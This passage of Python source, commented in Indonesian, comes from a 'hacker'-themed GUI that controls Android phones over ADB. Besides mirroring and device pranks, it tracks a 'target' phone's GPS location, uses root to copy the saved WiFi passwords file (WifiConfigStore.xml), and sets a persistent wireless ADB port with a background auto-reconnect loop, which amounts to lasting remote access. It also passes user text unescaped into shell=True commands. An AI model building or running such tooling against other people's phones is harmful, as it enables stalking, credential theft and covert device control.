        scrcpy_cmd = self.config.get("scrcpy_path", "scrcpy")
        
        try:
            self.after(0, self.log, f"Mencoba menjalankan Scrcpy dari: {scrcpy_cmd}...")
            command = f'"{scrcpy_cmd}" -s {active_serial} --always-on-top'
            subprocess.run(command, shell=True, check=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
        except (subprocess.CalledProcessError, FileNotFoundError):
            self.after(0, self.log, "❌ 'scrcpy' tidak ditemukan. Silakan tunjukkan lokasinya.")
            self.after(0, self.prompt_for_scrcpy_path)

    def prompt_for_scrcpy_path(self):
        """Membuka dialog untuk meminta pengguna menunjukkan lokasi scrcpy.exe."""
        from tkinter import filedialog, messagebox
        
        messagebox.showinfo("Scrcpy Tidak Ditemukan", "Silakan tunjukkan lokasi file 'scrcpy.exe' Anda.")
        filepath = filedialog.askopenfilename(
            title="Pilih scrcpy.exe",
            filetypes=[("Executable", "*.exe"), ("All files", "*.*")]
        )
        if filepath and "scrcpy.exe" in os.path.basename(filepath).lower():
            self.config["scrcpy_path"] = filepath
            self.save_config()
            self.log(f"✅ Path Scrcpy telah disimpan. Silakan coba jalankan 'Mirror Scrcpy' lagi.")
        elif filepath:
            self.log("❌ File yang dipilih bukan 'scrcpy.exe'. Silakan coba lagi.")

    def send_toast(self):
        dialog = CustomInputDialog(self, title="Kirim Pesan Toast", text="Masukkan pesan yang akan ditampilkan:", theme=HACKER_THEME)
        message = dialog.get_input()
        if message:
            self.run_command_in_thread(f"shell am broadcast -a com.android.systemui.demo -e command toast -e text '{message}'")

    def toggle_spam_back(self):
        """Memulai atau menghentikan spam tombol 'Back'."""
        if self.is_spamming_back:
            # Stop the spam
            self.is_spamming_back = False
            self.log("Menghentikan spam tombol 'Back'...")
            self.spam_back_button_widget.configure(text="Spam Tombol Back", fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])
        else:
            # Start the spam
            if not self.active_device_serial:
                self.log("Error: Tidak ada perangkat aktif yang dipilih.")
                return
            
            self.is_spamming_back = True
            self.log("Memulai spam tombol 'Back' tanpa henti...")
            self.spam_back_button_widget.configure(text="⏹️ Stop Spam Back", fg_color="#008080", hover_color="#00CED1")
            
            self.spam_back_thread = threading.Thread(target=self._execute_spam_back, args=(self.active_device_serial,))
            self.spam_back_thread.daemon = True
            self.spam_back_thread.start()

    def _execute_spam_back(self, active_serial):
        """Fungsi thread yang menjalankan loop spam."""
        while self.is_spamming_back:
            subprocess.run(f"adb -s {active_serial} shell input keyevent 4", shell=True, capture_output=True)
            time.sleep(0.1) # Jeda singkat antar tekanan tombol
        self.after(0, self.log, "Spam tombol 'Back' telah dihentikan.")

    def power_off(self):
        dialog = CustomInputDialog(self, title="PERINGATAN KERAS!", text="Ini akan MEMATIKAN perangkat.\nKetik 'YES' untuk konfirmasi:", theme=HACKER_THEME)
        confirmation = dialog.get_input()
        if confirmation == "YES":
            self.log("MENGIRIM PERINTAH POWER OFF!")
            self.run_command_in_thread("shell reboot -p")
        else:
            self.log("Operasi Power Off dibatalkan.")

    def vibrate_device(self):
        """Memulai getaran perangkat di thread terpisah, mencoba beberapa metode."""
        if not self.active_device_serial:
            self.log("Error: Tidak ada perangkat aktif yang dipilih.")
            return
        self.log("Mencoba menggetarkan perangkat (5 detik)...")
        thread = threading.Thread(target=self._execute_vibration, args=(self.active_device_serial,))
        thread.daemon = True
        thread.start()

    def _execute_vibration(self, active_serial):
        """Fungsi thread yang mencoba beberapa perintah getar."""
        adb_prefix = f"adb -s {active_serial}"

        # Metode 1: Perintah standar
        self.after(0, self.log, "-> Mencoba Metode 1 (standar)...")
        cmd1 = f"{adb_prefix} shell cmd vibrator vibrate 5000"
        proc1 = subprocess.run(cmd1, shell=True, capture_output=True, text=True, timeout=10)
        if proc1.returncode == 0 and "Can't find service" not in proc1.stderr:
            self.after(0, self.log, "✅ Getaran berhasil dengan Metode 1.")
            return

        # Metode 2: Metode root (sysfs)
        self.after(0, self.log, "-> Metode 1 gagal. Mencoba Metode 2 (root)...")
        cmd2 = f"{adb_prefix} shell \"su -c 'echo 5000 > /sys/class/timed_output/vibrator/enable'\""
        proc2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True, timeout=10)
        if proc2.returncode == 0:
            self.after(0, self.log, "✅ Getaran berhasil dengan Metode 2 (root).")
            return

        self.after(0, self.log, "❌ Semua metode getar gagal. Perangkat mungkin tidak mendukung perintah ini.")

    def track_location(self):
        """Memulai pelacakan lokasi perangkat."""
        self.log("🛰️ Mencoba melacak lokasi perangkat...")
        self.log("Pastikan GPS dan layanan lokasi di perangkat target aktif.")
        self.run_command_in_thread("shell dumpsys location", callback=self._process_location_output)

    def _process_location_output(self, output):
        """Callback untuk memproses output dari dumpsys location."""
        # Mencoba beberapa pola regex, diurutkan dari yang paling akurat
        patterns = [
            r"fused: Location\[fused ([\-0-9.]+),([\-0-9.]+)",        # Provider Fused (kombinasi, terbaik)
            r"gps: Location\[gps ([\-0-9.]+),([\-0-9.]+)",            # Provider GPS
            r"network: Location\[network ([\-0-9.]+),([\-0-9.]+)",    # Provider Jaringan (kurang akurat)
            r"last location=Location\[fused ([\-0-9.]+),([\-0-9.]+)" # Format lain untuk lokasi terakhir
        ]
        
        match = None
        for pattern in patterns:
            match = re.search(pattern, output)
            if match:
                break # Hentikan pencarian jika sudah ditemukan
        
        if match:
            lat, lon = match.group(1), match.group(2)
            self.log(f"✅ Lokasi ditemukan! Lat: {lat}, Lon: {lon}")
            maps_url = f"https://www.google.com/maps?q={lat},{lon}"
            self.log(f"Membuka lokasi di browser...")
            webbrowser.open(maps_url)
        else:
            self.log("❌ Lokasi tidak ditemukan. Coba lagi atau pastikan GPS aktif.")
            self.log("💡 TIPS: Buka Google Maps di HP target untuk 'membangunkan' layanan lokasi, lalu coba lagi.")

    def toggle_flashlight(self):
        """Memulai atau menghentikan senter sebagai toggle."""
        if not self.active_device_serial:
            self.log("Error: Tidak ada perangkat aktif yang dipilih.")
            return

        target_state_on = not self.is_flashlight_on
        
        thread = threading.Thread(target=self._execute_flashlight_toggle, args=(self.active_device_serial, target_state_on))
        thread.daemon = True
        thread.start()

    def _execute_flashlight_toggle(self, active_serial, turn_on):
        """Fungsi thread yang mencoba beberapa perintah senter."""
        adb_prefix = f"adb -s {active_serial}"
        action_text = "menyalakan" if turn_on else "mematikan"
        self.after(0, self.log, f"Mencoba {action_text} senter...")

        # --- Metode 1: Non-Root (Android 13+) ---
        self.after(0, self.log, "-> Mencoba Metode 1 (Non-Root)...")
        torch_state = "on" if turn_on else "off"
        cmd1 = f"{adb_prefix} shell cmd camera set-torch-mode 0 {torch_state}"
        proc1 = subprocess.run(cmd1, shell=True, capture_output=True, text=True, timeout=10)
        
        if proc1.returncode == 0 and not proc1.stderr:
            self.after(0, self.log, f"✅ Senter berhasil di-{action_text} dengan Metode 1.")
            self.is_flashlight_on = turn_on
            self.after(0, self._update_flashlight_button_state)
            return

        # --- Metode 2: Root (Legacy) ---
        self.after(0, self.log, "-> Metode 1 gagal. Mencoba Metode 2 (Root)...")
        brightness_value = "255" if turn_on else "0"
        possible_paths = [
            "/sys/class/leds/flashlight/brightness",
            "/sys/class/leds/torch-light/brightness",
            "/sys/class/leds/led:torch_0/brightness",
            "/sys/class/leds/torch/brightness",
        ]
        
        for path in possible_paths:
            cmd2 = f"{adb_prefix} shell \"su -c 'echo {brightness_value} > {path}'\""
            proc2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True, timeout=10)
            if proc2.returncode == 0 and "not found" not in proc2.stderr and "inaccessible" not in proc2.stderr:
                self.after(0, self.log, f"✅ Senter berhasil di-{action_text} dengan Metode 2 (Path: {path}).")
                self.is_flashlight_on = turn_on
                self.after(0, self._update_flashlight_button_state)
                return
        
        self.after(0, self.log, f"❌ Semua metode untuk {action_text} senter gagal.")

    def _update_flashlight_button_state(self):
        """Memperbarui UI tombol senter berdasarkan state."""
        if self.is_flashlight_on:
            self.flashlight_button_widget.configure(text="🔦 Matikan Senter", fg_color="#008080", hover_color="#00CED1")
        else:
            self.flashlight_button_widget.configure(text="🔦 Senter", fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])

    def get_wifi_passwords(self):
        """Mencoba mengambil file konfigurasi WiFi (memerlukan root)."""
        self.log("Mencoba mengambil kata sandi WiFi...")
        self.log("⚠️ FITUR INI MEMERLUKAN AKSES ROOT DI PERANGKAT TARGET.")
        self.run_command_in_thread("shell \"su -c 'cat /data/misc/wifi/WifiConfigStore.xml'\"", save_to_file="wifi_passwords.xml")

    def install_apk(self):
        """Membuka dialog file untuk memilih dan menginstal APK."""
        from tkinter import filedialog
        filepath = filedialog.askopenfilename(
            title="Pilih file APK untuk diinstal",
            filetypes=[("Android Package", "*.apk"), ("All files", "*.*")]
        )
        if filepath:
            self.log(f"Memulai instalasi {os.path.basename(filepath)}...")
            # Perintah 'install' bisa memakan waktu, jadi jalankan di thread
            self.run_command_in_thread(f'install "{filepath}"')
        else:
            self.log("Instalasi APK dibatalkan.")

    def uninstall_apk(self):
        """Meminta nama paket dan menghapusnya."""
        dialog = CustomInputDialog(self, title="Uninstall Aplikasi", text="Masukkan nama paket (cth: com.google.android.youtube):", theme=HACKER_THEME)
        package_name = dialog.get_input()
        if package_name:
            self.log(f"Mencoba menghapus paket: {package_name}...")
            self.run_command_in_thread(f"shell pm uninstall {package_name}")
        else:
            self.log("Proses uninstall dibatalkan.")

    def force_stop_app(self):
        """Meminta nama paket dan memaksa berhenti."""
        dialog = CustomInputDialog(self, title="Force Stop Aplikasi", text="Masukkan nama paket (cth: com.google.android.youtube):", theme=HACKER_THEME)
        package_name = dialog.get_input()
        if package_name:
            self.log(f"Mencoba menghentikan paksa: {package_name}...")
            self.run_command_in_thread(f"shell am force-stop {package_name}")

    def enable_persistent_adb(self):
        """Mengaktifkan ADB over TCP secara permanen (memerlukan root)."""
        if not self.active_device_serial:
            self.log("Error: Tidak ada perangkat aktif yang dipilih.")
            return

        dialog = CustomInputDialog(self, title="KONFIRMASI", text="Fitur ini memerlukan ROOT dan akan REBOOT perangkat.\nIni akan membuat ADB Wireless aktif otomatis setelah reboot.\nKetik 'PERSIST' untuk melanjutkan:", theme=HACKER_THEME)
        confirmation = dialog.get_input()
        if confirmation == "PERSIST":
            self.log("Memulai proses aktivasi ADB persisten...")
            thread = threading.Thread(target=self._execute_persistent_adb_toggle, args=(self.active_device_serial, True))
            thread.daemon = True
            thread.start()
        else:
            self.log("Aktivasi ADB persisten dibatalkan.")

    def disable_persistent_adb(self):
        """Menonaktifkan ADB over TCP yang permanen (memerlukan root)."""
        if not self.active_device_serial:
            self.log("Error: Tidak ada perangkat aktif yang dipilih.")
            return

        dialog = CustomInputDialog(self, title="KONFIRMASI", text="Ini akan menonaktifkan ADB Wireless otomatis saat boot dan akan REBOOT perangkat.\nKetik 'DISABLE' untuk melanjutkan:", theme=HACKER_THEME)
        confirmation = dialog.get_input()
        if confirmation == "DISABLE":
            self.log("Memulai proses deaktivasi ADB persisten...")
            thread = threading.Thread(target=self._execute_persistent_adb_toggle, args=(self.active_device_serial, False))
            thread.daemon = True
            thread.start()
        else:
            self.log("Deaktivasi ADB persisten dibatalkan.")

    def _execute_persistent_adb_toggle(self, active_serial, enable):
        """Fungsi thread untuk mengaktifkan atau menonaktifkan ADB persisten."""
        adb_prefix = f"adb -s {active_serial}"
        
        self.after(0, self.log, "Langkah 1: Mencoba mendapatkan akses root...")
        proc_root = subprocess.run(f"{adb_prefix} root", shell=True, capture_output=True, text=True, timeout=10)
        
        if "restarting adbd as root" in proc_root.stdout or "adbd is already running as root" in proc_root.stdout:
            self.after(0, self.log, "✅ Akses root berhasil. Menunggu ADB stabil...")
            time.sleep(5)

            # --- Logic to save/remove persistent IP ---
            if enable:
                device_ip = self._get_device_ip(active_serial)
                if device_ip:
                    self.after(0, self.log, f"Menyimpan IP persisten: {device_ip}")
                    self.config['persistent_adb_ip'] = device_ip
                    self.after(0, self.save_config)
                else:
                    self.after(0, self.log, "⚠️ Peringatan: Gagal mendapatkan IP perangkat. Auto-reconnect mungkin tidak berfungsi.")
            else: # if disabling
                if 'persistent_adb_ip' in self.config:
                    self.after(0, self.log, "Menghapus IP persisten dari konfigurasi.")
                    del self.config['persistent_adb_ip']
                    self.after(0, self.save_config)
            
            prop_value = "5555" if enable else "-1"
            self.after(0, self.log, f"Langkah 2: Mengatur properti persisten (port: {prop_value})...")
            subprocess.run(f"{adb_prefix} shell setprop persist.adb.tcp.port {prop_value}", shell=True, capture_output=True, text=True, timeout=10)
            self.after(0, self.log, "Langkah 3: Merestart perangkat untuk menerapkan perubahan...")
            subprocess.Popen(f"{adb_prefix} reboot", shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
            self.after(0, self.log, "Perangkat sedang direstart. Setelah menyala, koneksi akan dicoba secara otomatis.")
        else:
            self.after(0, self.log, f"❌ Gagal mendapatkan akses root. Perangkat mungkin tidak di-root. Error: {proc_root.stderr.strip()}")

    def _get_device_ip(self, serial):
        """Mendapatkan alamat IP WiFi dari perangkat yang terhubung (USB atau TCP)."""
        if not serial:
            return None
        
        # Jika serial sudah berupa IP
        if ":" in serial:
            return serial.split(":")[0]

        # Jika serial adalah USB, cari IP dari wlan0
        ip_command = f"adb -s {serial} shell ip addr show wlan0"
        process = subprocess.run(ip_command, shell=True, capture_output=True, text=True, timeout=5)
        if process.returncode == 0:
            match = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", process.stdout)
            if match:
                return match.group(1)
        return None

    def forget_persistent_adb(self):
        """Menghapus IP persisten dari konfigurasi lokal."""
        if 'persistent_adb_ip' in self.config:
            removed_ip = self.config.pop('persistent_adb_ip')
            self.save_config()
            self.log(f"✅ Kunci persisten untuk IP {removed_ip} telah dilupakan.")
            self.log("Aplikasi tidak akan lagi mencoba auto-reconnect ke alamat tersebut.")
        else:
            self.log("Tidak ada kunci persisten yang tersimpan untuk dilupakan.")

    def _start_auto_reconnect_loop(self):
        """Memulai thread untuk auto-reconnect."""
        thread = threading.Thread(target=self._auto_reconnect_loop, daemon=True)
        thread.start()

    def _auto_reconnect_loop(self):
        """Secara periodik mencoba menghubungkan kembali ke IP persisten."""
        self.log("Layanan auto-reconnect dimulai.")
        while True:
            time.sleep(15) # Cek setiap 15 detik
            
            persistent_ip = self.config.get('persistent_adb_ip')
            if not persistent_ip:
                continue # Tidak ada IP yang diatur, lewati

            target_serial = f"{persistent_ip}:5555"
            
            # Cek apakah sudah terhubung
            if target_serial in self.connected_devices:
                continue

            self.after(0, self.log, f"Mencoba auto-reconnect ke IP persisten: {target_serial}...")
            try:
                # Coba hubungkan dengan timeout singkat
                proc = subprocess.run(f"adb connect {target_serial}", shell=True, capture_output=True, text=True, timeout=5)
                output = (proc.stdout or proc.stderr).strip()
                if "connected to" in output or "already connected" in output:
                    # Loop status utama akan menangani sisanya
                    self.after(0, self.log, f"✅ Auto-reconnect ke {target_serial} berhasil.")
            except Exception:
                # Abaikan error seperti timeout, loop akan mencoba lagi nanti.
                pass

if __name__ == "__main__":
    app = App()
    app.mainloop()